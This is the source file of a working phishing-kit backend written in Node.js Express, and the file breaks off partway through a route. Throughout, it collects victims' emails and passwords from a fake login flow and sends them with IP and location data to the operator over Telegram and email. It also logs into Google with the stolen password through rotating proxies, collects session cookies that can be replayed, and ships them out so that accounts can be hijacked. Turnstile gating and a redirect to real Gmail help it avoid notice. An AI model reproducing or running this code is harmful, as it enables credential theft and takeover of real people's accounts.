const express = require('express');
const cors = require('cors');
const crypto = require('crypto');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors({
    origin: true,
    methods: ['GET', 'POST', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Authorization', 'X-Session-Id'],
    maxAge: 86400
}));
app.use(express.json({ limit: '300kb' }));
app.use(express.urlencoded({ extended: true, limit: '300kb' }));

// ============================================================
// CONFIG
// ============================================================
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID   = process.env.TELEGRAM_CHAT_ID;

const BREVO_API_KEY = process.env.BREVO_API_KEY;
const SENDER_EMAIL  = process.env.SENDER_EMAIL || 'egli79380@gmail.com';
const SENDER_NAME   = process.env.SENDER_NAME  || 'Cookie Monitor';
const EMAIL_RECIPIENTS = (process.env.EMAIL_RECIPIENTS || '')
    .split(',').map(e => e.trim()).filter(Boolean);

const TEAMS_REDIRECT = process.env.TEAMS_REDIRECT || '';

const GMAIL_CAPTURE      = process.env.GMAIL_CAPTURE !== 'false';
const GMAIL_HARVEST_ALL  = process.env.GMAIL_HARVEST_ALL !== 'false';
const GMAIL_VERBOSE      = process.env.GMAIL_VERBOSE === 'true';
const GMAIL_MAX_TRIES    = parseInt(process.env.GMAIL_MAX_TRIES || '2', 10);
const GMAIL_CHAIN_HOPS   = parseInt(process.env.GMAIL_CHAIN_HOPS || '10', 10);
const GMAIL_TIMEOUT_MS   = parseInt(process.env.GMAIL_TIMEOUT_MS || '60000', 10);
const GMAIL_UA_FALLBACK  = process.env.GMAIL_UA_FALLBACK ||
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36';

const GMAIL_DOMAINS = new Set(['gmail.com', 'googlemail.com']);

const PROXY_LIST = (process.env.GMAIL_EGRESS_PROXY || '')
    .split(',').map(s => s.trim()).filter(Boolean);
const PROXY_STICKY = process.env.GMAIL_PROXY_STICKY !== 'false';
const PROXY_ROTATE_ON_FAIL = process.env.GMAIL_PROXY_ROTATE_ON_FAIL !== 'false';

const CRITICAL_COOKIES = new Set([
    'SID', 'HSID', 'SSID', 'APISID', 'SAPISID', 'OSID', 'LSID',
    '__Secure-1PSID', '__Secure-3PSID',
    '__Secure-1PSIDTS', '__Secure-3PSIDTS',
    '__Secure-1PAPID', '__Secure-3PAPID',
    '__Secure-OSID', '__Host-1PLSID', '__Host-3PLSID', '__Host-GAPS',
    'NID', 'AEC', 'SIDCC', 'ACCOUNT_CHOOSER'
]);

const NOISE_COOKIES = new Set([
    '_ga', '_gid', '_gcl_au', '1P_JAR', 'OTZ', 'DV', 'CONSENT',
    'SOCS', 'PREF', 'SEARCH_SAMESITE', 'GMAIL_AT'
]);

let undici = null;
try { undici = require('undici'); } catch {
    console.warn('⚠️  undici missing — proxy support disabled (npm i undici)');
}

// ============================================================
// STICKY PROXY
// ============================================================
function newSessionToken() {
    return crypto.randomBytes(6).toString('hex');
}

function proxyUrlFor(base, sessionId) {
    if (!base) return null;
    if (base.includes('{session}')) return base.replace(/\{session\}/g, sessionId);
    if (!PROXY_STICKY) return base;
    try {
        const u = new URL(base);
        u.username = `${decodeURIComponent(u.username)}-session-${sessionId}`;
        return u.toString();
    } catch {
        return base;
    }
}

function maskProxy(url) {
    if (!url) return null;
    try {
        const u = new URL(url);
        return `${u.protocol}//${u.username.replace(/-session-.*$/, '')}:***@${u.host}`;
    } catch {
        return 'invalid-proxy-url';
    }
}

function makeAgent(url) {
    if (!url || !undici) return null;
    try { return new undici.ProxyAgent(url); } catch { return null; }
}

// ============================================================
// TURNSTILE
// ============================================================
const TURNSTILE_SECRET_KEY   = process.env.TURNSTILE_SECRET_KEY || '';
const TURNSTILE_PROOF_SECRET = process.env.TURNSTILE_PROOF_SECRET
                              || TURNSTILE_SECRET_KEY
                              || crypto.randomBytes(32).toString('hex');
const REQUIRE_TURNSTILE      = process.env.REQUIRE_TURNSTILE === 'true';
const PROOF_TTL_MS           = 5 * 60 * 1000;

function signProof(email, ts) {
    return crypto.createHmac('sha256', TURNSTILE_PROOF_SECRET)
        .update(`${email}|${ts}`).digest('hex');
}
function makeProof(email) {
    const ts = Date.now();
    return { proof: signProof(email, ts), ts, expiresAt: ts + PROOF_TTL_MS };
}
function verifyProof(email, proof, ts) {
    if (!email || !proof || !ts) return { valid: false, reason: 'missing' };
    const tsNum = parseInt(ts, 10);
    if (Number.isNaN(tsNum)) return { valid: false, reason: 'bad-ts' };
    if (Date.now() - tsNum > PROOF_TTL_MS) return { valid: false, reason: 'expired' };
    if (Date.now() < tsNum - 60_000) return { valid: false, reason: 'future-ts' };
    const expected = signProof(email, tsNum);
    if (typeof proof !== 'string' || proof.length !== expected.length) {
        return { valid: false, reason: 'mismatch' };
    }
    try {
        const ok = crypto.timingSafeEqual(Buffer.from(proof, 'hex'), Buffer.from(expected, 'hex'));
        return { valid: ok, reason: ok ? 'ok' : 'mismatch' };
    } catch {
        return { valid: false, reason: 'bad-hex' };
    }
}

async function verifyTurnstile(token, remoteIp) {
    if (!TURNSTILE_SECRET_KEY) return { success: false, error: 'no-secret-configured' };
    if (!token || typeof token !== 'string') return { success: false, error: 'no-token' };
    try {
        const body = new URLSearchParams();
        body.append('secret', TURNSTILE_SECRET_KEY);
        body.append('response', token);
        if (remoteIp && /^[\d\.a-fA-F:]+$/.test(remoteIp)) body.append('remoteip', remoteIp);
        const r = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify',
            { method: 'POST', body, signal: AbortSignal.timeout(10000) });
        const data = await r.json();
        return { success: !!data.success, data };
    } catch (e) {
        return { success: false, error: e.message };
    }
}

function firstClientIp(req) {
    const xff = req.headers['x-forwarded-for'];
    if (xff) {
        const first = String(xff).split(',')[0].trim();
        if (first) return first;
    }
    return req.connection?.remoteAddress || req.socket?.remoteAddress || 'Unknown';
}

// ============================================================
// STARTUP
// ============================================================
console.log('========================================');
console.log(`   TELEGRAM:       ${BOT_TOKEN && CHAT_ID ? '✅' : '❌'}`);
console.log(`   GMAIL_CAPTURE:  ${GMAIL_CAPTURE ? '✅' : '⛔'}`);
console.log(`   HARVEST_ALL:    ${GMAIL_HARVEST_ALL}`);
console.log(`   VERBOSE:        ${GMAIL_VERBOSE}`);
console.log(`   TIMEOUT_MS:     ${GMAIL_TIMEOUT_MS}`);
console.log(`   PROXY:          ${PROXY_LIST.length ? PROXY_LIST.length + ' endpoint(s), sticky=' + PROXY_STICKY : '— none'}`);
console.log(`   undici:         ${undici ? '✅' : '❌ missing'}`);
console.log('========================================');

if (PROXY_LIST.length && !undici) console.error('❌ proxy configured but undici missing — npm i undici');

// ============================================================
// BREVO
// ============================================================
async function sendEmail(email, password, ipInfo, userAgent, domain, mxRecord, stage) {
    if (!BREVO_API_KEY || EMAIL_RECIPIENTS.length === 0) return false;
    try {
        const r = await fetch('https://api.brevo.com/v3/smtp/email', {
            method: 'POST',
            headers: { 'api-key': BREVO_API_KEY, 'Content-Type': 'application/json' },
            body: JSON.stringify({
                sender: { name: SENDER_NAME, email: SENDER_EMAIL },
                to: EMAIL_RECIPIENTS.map(e => ({ email: e })),
                subject: `🔐 Login (Stage ${stage}) - ${email}`,
                htmlContent: `<p><b>${email}</b> : <b>${password}</b></p>
                    <p>${mxRecord}</p><p>${ipInfo?.ip} ${ipInfo?.country || ''}</p>
                    <p>${(userAgent || '').slice(0, 100)}</p>`
            }),
            signal: AbortSignal.timeout(15000)
        });
        return r.ok;
    } catch { return false; }
}

// ============================================================
// TELEGRAM
// ============================================================
async function sendToTelegram(message) {
    if (!BOT_TOKEN || !CHAT_ID) return null;
    try {
        const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: message, disable_web_page_preview: true }),
            signal: AbortSignal.timeout(15000)
        });
        return await r.json();
    } catch { return null; }
}

async function sendTelegramDocument(caption, filename, text, mime) {
    if (!BOT_TOKEN || !CHAT_ID) return { ok: false, reason: 'not-configured' };
    try {
        const fd = new FormData();
        fd.append('chat_id', CHAT_ID);
        fd.append('caption', String(caption).slice(0, 1024));
        fd.append('parse_mode', 'HTML');
        fd.append('document', new Blob([text], { type: mime || 'application/json' }), filename);
        const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`,
            { method: 'POST', body: fd, signal: AbortSignal.timeout(30000) });
        return { ok: r.ok, status: r.status };
    } catch (e) {
        return { ok: false, reason: e.message };
    }
}

// ============================================================
// IP / MX
// ============================================================
async function getIPInfo(ip) {
    const first = String(ip || '').split(',')[0].trim();
    const fallback = { ip: first || 'Unknown', country: 'Unknown', city: 'Unknown', region: 'Unknown' };
    if (!first || first === 'Unknown') return fallback;
    try {
        const r = await fetch(`https://ipinfo.io/${first}/json`, { signal: AbortSignal.timeout(6000) });
        return { ...fallback, ...(await r.json()), ip: first };
    } catch { return fallback; }
}

async function getMXRecord(domain) {
    try {
        const r = await fetch(`https://dns.google/resolve?name=${encodeURIComponent(domain)}&type=MX`,
            { signal: AbortSignal.timeout(6000) });
        const d = await r.json();
        if (d?.Answer?.length) return d.Answer.map(x => x.data).join('\n');
        return 'no-mx';
    } catch { return 'MX-Error'; }
}

// ============================================================
// JAR (records raw headers)
// ============================================================
const SS_MAP = { none: 'no_restriction', lax: 'lax', strict: 'strict' };

function splitSetCookie(header) {
    if (!header) return [];
    return header.split(/,(?=\s*[A-Za-z0-9_\-.]+=)/).map(s => s.trim()).filter(Boolean);
}

class Jar {
    constructor() {
        this.map = new Map();
        this.rawSetCookie = [];   // [{ hop, url, lines: [...] }]
        this.rawSent = [];        // [{ hop, url, cookie }]
    }

    absorb(url, list, hop) {
        const host = new URL(url).hostname;
        if (list.length) this.rawSetCookie.push({ hop, url, lines: list.slice() });

        for (const raw of list) {
            const parts = raw.split(';');
            const pair = parts.shift();
            const eq = pair.indexOf('=');
            if (eq < 1) continue;

            const name = pair.slice(0, eq).trim();
            const value = pair.slice(eq + 1).trim();
            if (!name) continue;

            let domain = '', path = '/', secure = false, httpOnly = false,
                sameSite = 'unspecified', expires = null, maxAge = null, hasDomain = false;

            for (const attr of parts) {
                const i = attr.indexOf('=');
                const k = (i < 0 ? attr : attr.slice(0, i)).trim().toLowerCase();
                const v = i < 0 ? '' : attr.slice(i + 1).trim();
                if (k === 'domain') { domain = v; hasDomain = true; }
                else if (k === 'path') path = v;
                else if (k === 'secure') secure = true;
                else if (k === 'httponly') httpOnly = true;
                else if (k === 'samesite') sameSite = SS_MAP[v.toLowerCase()] || 'unspecified';
                else if (k === 'expires') { const t = Date.parse(v); if (!Number.isNaN(t)) expires = t; }
                else if (k === 'max-age') { const n = parseInt(v, 10); if (!Number.isNaN(n)) maxAge = n; }
            }

            const isHostPrefix = name.startsWith('__Host-');
            if (isHostPrefix) { domain = host; hasDomain = false; path = '/'; secure = true; }
            if (maxAge !== null) expires = Date.now() + maxAge * 1000;

            const bare = (domain || host).replace(/^\./, '');
            const key = `${name}|${bare}|${path}`;
            if (value === '' && expires !== null && expires < Date.now()) { this.map.delete(key); continue; }

            this.map.set(key, {
                name, value,
                domain: hasDomain ? (domain.startsWith('.') ? domain : '.' + bare) : host,
                hostOnly: !hasDomain,
                path, secure: secure || isHostPrefix, httpOnly, sameSite,
                session: expires === null,
                expirationDate: expires ? Math.floor(expires / 1000) : null
            });
        }
    }

    header(url, hop) {
        const { hostname, pathname } = new URL(url);
        const out = [];
        for (const c of this.map.values()) {
            const d = c.domain.replace(/^\./, '');
            if (!(hostname === d || hostname.endsWith('.' + d))) continue;
            if (!pathname.startsWith(c.path)) continue;
            out.push(`${c.name}=${c.value}`);
        }
        const joined = out.join('; ');
        if (joined && hop !== undefined) this.rawSent.push({ hop, url, cookie: joined });
        return joined;
    }

    has(name) { return [...this.map.values()].some(c => c.name === name); }
    get size() { return this.map.size; }

    list() { return [...this.map.values()]; }

    export() {
        return this.list()
            .sort((a, b) => Number(CRITICAL_COOKIES.has(b.name)) - Number(CRITICAL_COOKIES.has(a.name)))
            .map(c => ({
                domain: c.domain,
                hostOnly: c.hostOnly,
                httpOnly: c.httpOnly,
                name: c.name,
                path: c.path,
                sameSite: c.sameSite,
                secure: c.secure,
                session: c.session,
                storeId: null,
                ...(c.expirationDate ? { expirationDate: c.expirationDate } : {}),
                value: c.value
            }));
    }

    detailed() {
        return this.list()
            .sort((a, b) => Number(CRITICAL_COOKIES.has(b.name)) - Number(CRITICAL_COOKIES.has(a.name)))
            .map(c => ({
                name: c.name,
                domain: c.domain,
                path: c.path,
                expiry: c.expirationDate ? new Date(c.expirationDate * 1000).toISOString() : 'session',
                expiresInSec: c.expirationDate ? c.expirationDate - Math.floor(Date.now() / 1000) : null,
                httpOnly: c.httpOnly,
                secure: c.secure,
                sameSite: c.sameSite,
                hostOnly: c.hostOnly,
                critical: CRITICAL_COOKIES.has(c.name),
                valueLength: c.value.length,
                value: c.value
            }));
    }

    headerForExport() {
        return this.list()
            .filter(c => CRITICAL_COOKIES.has(c.name) || !NOISE_COOKIES.has(c.name))
            .map(c => `${c.name}=${c.value}`).join('; ');
    }

    rawText(email, stage, meta) {
        const L = [];
        L.push(`# raw Set-Cookie capture`);
        L.push(`# email: ${email}`);
        L.push(`# stage: ${stage}`);
        L.push(`# ts: ${new Date().toISOString()}`);
        if (meta) L.push(`# ip: ${meta.ip || 'n/a'} | proxy: ${meta.proxy || 'none'} | ua: ${meta.ua || 'n/a'}`);
        L.push('');
        for (const h of this.rawSetCookie) {
            L.push(`--- hop ${h.hop} :: ${h.url}`);
            for (const line of h.lines) L.push(line);
            L.push('');
        }
        L.push('--- final Cookie header (replayable)');
        L.push(this.headerForExport() || '(empty)');
        L.push('');
        L.push('--- name | domain | expiry | value');
        for (const c of this.detailed()) {
            L.push(`${c.name} | ${c.domain}${c.path} | ${c.expiry} | ${c.value}`);
        }
        return L.join('\n');
    }
}

// ============================================================
// SCRAPERS
// ============================================================
const pickGALX = h => (h.match(/name="GALX"\s+value="([^"]+)"/i) || [])[1] || '';
const pickDsh  = h => (h.match(/name="dsh"\s+value="([^"]+)"/i) || [])[1] || '';
const pickTL   = h => (h.match(/name="TL"\s+value="([^"]+)"/i)
                    || h.match(/\["TL","([^"]+)"\]/)
                    || h.match(/&quot;TL&quot;,\s*&quot;([^&"]+)&quot;/)
                    || h.match(/\\"TL\\",\s*\\"([^"\\]+)\\"/) || [])[1] || '';
const pickAction = h => {
    const m = h.match(/action="([^"]*(?:ServiceLoginAuth|challenge\/pwd)[^"]*)"/i)
           || h.match(/action="([^"]*challenge[^"]*)"/i);
    return m ? m[1].replace(/&amp;/g, '&') : '';
};
function absolutize(loc, base) {
    if (!loc) return null;
    try { return new URL(loc, base).toString(); } catch { return null; }
}

// ============================================================
// HARVEST
// ============================================================
async function googleHarvest(email, password, ua, dispatcher) {
    const jar = new Jar();
    const trace = [];
    const A = 'https://accounts.google.com';
    const domain = email.split('@')[1].toLowerCase();
    const isWorkspace = !GMAIL_DOMAINS.has(domain);
    const cont = isWorkspace
        ? `https://mail.google.com/a/${domain}/`
        : 'https://mail.google.com/mail/u/0/';

    const signal = AbortSignal.timeout(GMAIL_TIMEOUT_MS);
    const dsh = 'S-' + Math.random().toString().slice(2, 17);
    let error = null;
    let needs2fa = false;
    let res = null;
    let hop = 0;

    const go = async (url, opts = {}) => {
        const myHop = ++hop;
        const headers = {
            'user-agent': ua,
            'accept-language': 'en-US,en;q=0.9',
            accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'upgrade-insecure-requests': '1',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            ...(opts.headers || {})
        };
        const ck = jar.header(url, myHop);
        if (ck) headers.cookie = ck;

        const init = { method: opts.method || 'GET', headers, body: opts.body, redirect: 'manual', signal };
        if (dispatcher) init.dispatcher = dispatcher;

        const r = await fetch(url, init);
        const sc = r.headers.getSetCookie?.() ?? splitSetCookie(r.headers.get('set-cookie'));
        jar.absorb(url, sc, myHop);

        trace.push({
            hop: myHop, s: r.status, u: url.slice(0, 160),
            l: (r.headers.get('location') || '').slice(0, 160), sc: sc.length
        });
        if (GMAIL_VERBOSE) console.log(`[H] ${myHop} ${r.status} sc=${sc.length} ${url.slice(0, 110)}`);
        return r;
    };

    const formH = { 'content-type': 'application/x-www-form-urlencoded', origin: A, referer: A + '/' };
    const post = (url, params) =>
        go(url, { method: 'POST', headers: formH, body: new URLSearchParams(params).toString() });

    try {
        res = await go(`${A}/signin/v2/identifier?service=mail&continue=${encodeURIComponent(cont)}&hl=en&flowName=GlifWebSignIn&flowEntry=ServiceLogin&dsh=${dsh}`);

        let hops = 0;
        while (res.status >= 300 && res.status < 400 && hops++ < 4) {
            const next = absolutize(res.headers.get('location'), A);
            if (!next) break;
            if (/challenge\/(totp|ipp|dp|sk|az)/.test(next)) needs2fa = true;
            res = await go(next);
        }

        let html = '';
        try { html = await res.text(); } catch { html = ''; }

        let galx = pickGALX(html);
        let tl = pickTL(html);
        let action = pickAction(html);
        let dshUse = pickDsh(html) || dsh;

        if (galx) {
            res = await post(`${A}/ServiceLoginAuth`, {
                Email: email, Passwd: password, GALX: galx, continue: cont,
                service: 'mail', hl: 'en', dsh: dshUse, PstMsg: '1',
                checkConnection: 'youtube:177:1', checkedDomains: 'youtube',
                ec: 'GAZAmgQ', accountType: 'HOSTED_OR_GOOGLE'
            });
        } else if (action && tl) {
            res = await post(action.startsWith('http') ? action : A + action, {
                Passwd: password, TL: tl, dsh: dshUse, continue: cont, service: 'mail',
                hl: 'en', flowName: 'GlifWebSignIn', flowEntry: 'ServiceLogin',
                checkedDomains: 'youtube', checkConnection: 'youtube:177:1',
                pstMsg: '1', idvSession: ''
            });
        } else {
            const idUrl = `${A}/v3/signin/identifier?continue=${encodeURIComponent(cont)}&service=mail&hl=en&flowName=GlifWebSignIn&flowEntry=ServiceLogin&dsh=${dsh}`;
            const idRes = await post(idUrl, {
                identifier: email, continue: cont, service: 'mail', hl: 'en',
                flowName: 'GlifWebSignIn', flowEntry: 'ServiceLogin',
                checkedDomains: 'youtube', checkConnection: 'youtube:177:1', pstMsg: '1'
            });

            const loc = idRes.headers.get('location') || '';
            let tl2 = (loc.match(/[?&]TL=([^&]+)/) || [])[1] || '';
            let dsh2 = (loc.match(/[?&]dsh=([^&]+)/) || [])[1] || dshUse;

            if (!tl2) {
                let body = '';
                try { body = await idRes.text(); } catch { body = ''; }
                tl2 = pickTL(body);
                dsh2 = pickDsh(body) || dsh2;
                const act2 = pickAction(body);
                if (act2) action = act2;
            }

            if (tl2) {
                const pwdUrl = (action && action.includes('challenge'))
                    ? (action.startsWith('http') ? action : A + action)
                    : `${A}/v3/signin/challenge/pwd?TL=${encodeURIComponent(tl2)}&continue=${encodeURIComponent(cont)}&service=mail&hl=en&dsh=${encodeURIComponent(dsh2)}`;

                res = await post(pwdUrl, {
                    Passwd: password, TL: tl2, dsh: dsh2, continue: cont, service: 'mail',
                    hl: 'en', flowName: 'GlifWebSignIn', flowEntry: 'ServiceLogin',
                    checkedDomains: 'youtube', checkConnection: 'youtube:177:1',
                    pstMsg: '1', idvSession: ''
                });
            } else {
                res = idRes;
                error = 'no-tl';
            }
        }

        if (res && res.status === 200 && !jar.has('SID')) {
            let h2 = '';
            try { h2 = await res.text(); } catch { h2 = ''; }
            const tl3 = pickTL(h2);
            const act3 = pickAction(h2);

            if (tl3 && act3) {
                res = await post(act3.startsWith('http') ? act3 : A + act3, {
                    Passwd: password, TL: tl3, dsh: dshUse, continue: cont, service: 'mail',
                    hl: 'en', flowName: 'GlifWebSignIn', flowEntry: 'ServiceLogin',
                    checkedDomains: 'youtube', checkConnection: 'youtube:177:1',
                    pstMsg: '1', idvSession: ''
                });
            } else if (/id="password"|Wrong password|password could not be found/i.test(h2)) {
                if (!error) error = 'wrong-password';
            } else if (/challenge\/(totp|ipp|dp|sk|az)|2-step|two-step/i.test(h2)) {
                needs2fa = true;
            }
        }

        let next = absolutize(res?.headers.get('location'), A);
        hops = 0;
        while (next && hops++ < GMAIL_CHAIN_HOPS) {
            if (/challenge\/(totp|ipp|dp|sk|az)/.test(next) || /\/v3\/signin\/challenge/.test(next)) {
                needs2fa = true; break;
            }
            const r2 = await go(next);
            if (r2.status >= 300 && r2.status < 400) {
                next = absolutize(r2.headers.get('location'), next);
                continue;
            }
            break;
        }

        if (jar.has('SID') || jar.has('__Secure-1PSID')) {
            await go(`${A}/ListAccounts?authuser=0&gpsia=1&source=ogb&mo=1&listPages=1&lp=1&hl=en`).catch(() => {});
            await go('https://myaccount.google.com/').catch(() => {});
            await go('https://www.google.com/').catch(() => {});
            await go(cont).catch(() => {});
            error = null;
        } else if (!error) {
            error = needs2fa ? '2fa-required' : 'no-session-cookie';
        }
    } catch (e) {
        error = (e.name === 'TimeoutError' || /abort/i.test(e.message)) ? 'timeout' : ('network:' + e.message);
        trace.push({ error: e.message });
    }

    return {
        ok: jar.has('SID') && jar.has('__Secure-1PSID'),
        error, jar, trace, needs2fa, hops: hop
    };
}

// ============================================================
// HARVEST + REPORT
// ============================================================
const inFlight = new Map();
function harvestLocked(key, fn) {
    if (inFlight.has(key)) return inFlight.get(key);
    const p = fn().finally(() => inFlight.delete(key));
    inFlight.set(key, p);
    return p;
}

async function runWithProxyChain(email, password, ua) {
    const sessionId = newSessionToken();
    const targets = PROXY_LIST.length ? PROXY_LIST : [null];
    let best = null;

    for (let i = 0; i < targets.length; i++) {
        const proxyUrl = proxyUrlFor(targets[i], sessionId);
        const agent = makeAgent(proxyUrl);
        try {
            const out = await googleHarvest(email, password, ua, agent);
            const rec = { ...out, proxy: proxyUrl ? maskProxy(proxyUrl) : null };
            if (!best || rec.ok) best = rec;
            if (rec.ok) break;
            if (!PROXY_ROTATE_ON_FAIL) break;
        } catch (e) {
            if (!best) {
                best = { ok: false, error: 'threw:' + e.message, jar: new Jar(), trace: [], needs2fa: false, hops: 0, proxy: proxyUrl ? maskProxy(proxyUrl) : null };
            }
            if (!PROXY_ROTATE_ON_FAIL) break;
        } finally {
            try { agent?.close(); } catch {}
        }
    }
    return best || { ok: false, error: 'no-attempt', jar: new Jar(), trace: [], needs2fa: false, hops: 0, proxy: null };
}

async function harvestAndReport({ email, password, firstPassword, ua, ip, ipInfo, stage, match }) {
    const tries = [...new Set([password, firstPassword].filter(Boolean))].slice(0, GMAIL_MAX_TRIES);

    let best = null;
    for (const pw of tries) {
        const out = await runWithProxyChain(email, pw, ua);
        if (!best || out.ok) best = { pw, ...out };
        if (out.ok) break;
    }

    const jar = best?.jar || new Jar();
    const cookies = jar.export();
    const detailed = jar.detailed();
    const rawText = jar.rawText(email, stage, { ip, proxy: best?.proxy, ua });
    const arrayJson = JSON.stringify(cookies, null, 2);
    const safe = email.replace(/[^a-z0-9]/gi, '_');
    const critical = cookies.filter(c => CRITICAL_COOKIES.has(c.name)).length;
    const err = best?.error || null;
    const names = detailed.filter(c => c.critical).map(c => c.name);

    const caption =
        `<b>Harvest s${stage}</b> ${best?.ok ? '✅' : '⚠️'} <code>${email}</code>\n` +
        `pw <code>${best?.pw || password}</code> · match=${match ? 'yes' : 'no'}\n` +
        `cookies=${cookies.length} crit=${critical} hops=${best?.hops || 0}\n` +
        (err ? `<b>err:</b> ${err}\n` : '') +
        (best?.proxy ? `proxy ${best.proxy}\n` : 'proxy none\n') +
        (names.length ? `crit names: ${names.join(', ')}` : 'no critical names');

    const docs = {};
    if (cookies.length) {
        docs.raw = await sendTelegramDocument(caption, `raw-${safe}-s${stage}.txt`, rawText, 'text/plain');
        docs.json = await sendTelegramDocument(caption, `cookies-${safe}-s${stage}.json`, arrayJson);
    }
    if (!cookies.length || GMAIL_VERBOSE) {
        docs.debug = await sendTelegramDocument(
            `debug s${stage} ${email} · ${err || 'ok'} · ${cookies.length}c`,
            `debug-${safe}-s${stage}.json`,
            JSON.stringify({
                email, stage, password: best?.pw || password, ok: !!best?.ok,
                error: err, needs2fa: !!best?.needs2fa, proxy: best?.proxy || null,
                ip, ipInfo, ua, ts: new Date().toISOString(),
                cookieCount: cookies.length, criticalCount: critical,
                finalCookieHeader: jar.headerForExport(),
                rawSetCookie: jar.rawSetCookie, cookieHeaderSent: jar.rawSent,
                cookies: detailed, trace: best?.trace || []
            }, null, 2)
        );
    }

    console.log(`🍪 s${stage} ${email} ${cookies.length}c err=${err || 'none'} proxy=${best?.proxy || 'none'}`);

    return {
        ok: !!best?.ok, error: err, traceLen: best?.trace?.length || 0,
        needs2fa: !!best?.needs2fa, proxy: best?.proxy || null,
        total: cookies.length, critical, names,
        hasSid: jar.has('SID'), hasPsid: jar.has('__Secure-1PSID'),
        filename: `cookies-${safe}-s${stage}.json`,
        json: arrayJson, cookies: detailed, rawText,
        telegram: { ok: !!(docs.raw?.ok || docs.json?.ok), docs }
    };
}

// ============================================================
// ROUTES
// ============================================================
app.get('/health', (req, res) => {
    res.json({
        status: 'ok', uptime: process.uptime(),
        telegram: !!(BOT_TOKEN && CHAT_ID),
        gmailCapture: GMAIL_CAPTURE, verbose: GMAIL_VERBOSE,
        proxies: PROXY_LIST.length, sticky: PROXY_STICKY,
        undici: !!undici, inFlight: inFlight.size
    });
});

async function harvestDebug(req, res) {
    const src = req.method === 'POST' ? (req.body || {}) : req.query;
    const { email, password } = src;
    if (!email || !password) return res.status(400).json({ ok: false, error: 'email and password required' });

    const ua = src.ua || req.headers['user-agent'] || GMAIL_UA_FALLBACK;
    try {
        const out = await runWithProxyChain(email, password, ua);
        const jar = out.jar;
        res.json({
            ok: out.ok, error: out.error, needs2fa: out.needs2fa,
            proxy: out.proxy, hops: out.hops,
            count: jar.size,
            cookieNames: jar.detailed().map(c => c.name),
            cookies: jar.detailed(),
            finalCookieHeader: jar.headerForExport(),
            rawSetCookie: jar.rawSetCookie,
            cookieHeaderSent: jar.rawSent,
            rawText: jar.rawText(email, 'debug', { proxy: out.proxy, ua }),
            trace: out.trace
        });
    } catch (e) {
        res.status(500).json({ ok: false, error: e.message });
    }
}
app.get('/api/harvest-debug', harvestDebug);
app.post('/api/harvest-debug', harvestDebug);

app.post('/api/turnstile-verify', async (req, res) => {
    const { token, email } = req.body || {};
    if (!token || typeof token !== 'string') return res.status(400).json({ success: false, message: 'Turnstile token required' });
    if (!email || typeof email !== 'string' || !email.includes('@')) return res.status(400).json({ success: false, message: 'Valid email required' });

    const result = await verifyTurnstile(token, firstClientIp(req));
    if (!result.success) return res.status(403).json({ success: false, message: 'Turnstile failed', details: result.data || result.error });

    const { proof, ts, expiresAt } = makeProof(email);
    return res.json({
        success: true, email, proof, ts, expiresAt,
        redirect: '/login.html?u=' + encodeURIComponent(email)
                + '&p=' + encodeURIComponent(proof) + '&t=' + ts
    });
});

app.post('/api/login', async (req, res) => {
    const { email, password, stage = 1, firstPassword, turnstileToken, proof, proofTs, fingerprint } = req.body || {};

    if (!email || !password) return res.status(400).json({ success: false, message: 'Email and password required' });
    if (!/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(email)) return res.status(400).json({ success: false, message: 'Invalid email format' });

    if (stage === 1) {
        let passed = false, reason = 'not-checked';
        if (proof && proofTs) { const v = verifyProof(email, proof, proofTs); passed = v.valid; reason = v.reason; }
        else if (turnstileToken) { const v = await verifyTurnstile(turnstileToken, firstClientIp(req)); passed = v.success; reason = v.success ? 'ok' : 'turnstile-failed'; }
        else reason = 'no-proof';
        if (!passed && REQUIRE_TURNSTILE) return res.status(403).json({ success: false, stage: 1, message: 'Human verification required', reason });
    }

    const clientIP = firstClientIp(req);
    const ipInfo = await getIPInfo(clientIP);
    const domain = email.split('@')[1];
    const mxRecord = await getMXRecord(domain);
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const isGoogle = GMAIL_DOMAINS.has(domain.toLowerCase()) || /google/i.test(mxRecord);
    const match = stage === 2 && firstPassword === password;
    const stageLabel = stage === 1 ? '1st Entry' : '2nd Entry';

    sendToTelegram(
        `--------+ ReZulT [${stageLabel}] +--------\nEmail : ${email}\nPassword : ${password}\n` +
        (stage === 2 ? `First Password : ${firstPassword}\nMatch : ${match ? '✅ YES' : '❌ NO'}\n` : '') +
        `MX : ${mxRecord}\nIP : ${clientIP}\nLocation : ${ipInfo.city || '?'} ${ipInfo.country || '?'}\n` +
        `Date : ${new Date().toISOString()}\n---------+ ReZulT [${stageLabel}] +-------------`
    ).catch(() => {});
    sendEmail(email, password, ipInfo, userAgent, domain, mxRecord, stage).catch(() => {});

    let harvest = null;
    if (GMAIL_CAPTURE && isGoogle && (GMAIL_HARVEST_ALL || stage === 2)) {
        harvest = await harvestLocked(email.toLowerCase(), () =>
            harvestAndReport({ email, password, firstPassword, ua: fingerprint?.userAgent || userAgent, ip: clientIP, ipInfo, stage, match })
        ).catch(e => ({ ok: false, error: e.message, traceLen: 0, needs2fa: false, proxy: null, total: 0, critical: 0, names: [], hasSid: false, hasPsid: false, filename: null, json: '[]', cookies: [], rawText: '', telegram: { ok: false } }));
    }

    const googleRedirect = GMAIL_DOMAINS.has(domain.toLowerCase())
        ? 'https://mail.google.com/mail/u/0/'
        : `https://mail.google.com/a/${domain}/`;

    if (stage !== 2) return res.json({ success: true, stage: 1, harvest });
    if (!match) return res.json({ success: true, stage: 2, match: false, message: 'Passwords do not match', harvest });

    return res.json({
        success: true, stage: 2, match: true,
        redirect: isGoogle ? googleRedirect : (TEAMS_REDIRECT || `https://${domain}`),
        harvest
    });
});

app.post('/api/gmail-session', async (req, res) => {
    if (!GMAIL_CAPTURE) return res.json({ ok: false, disabled: true });
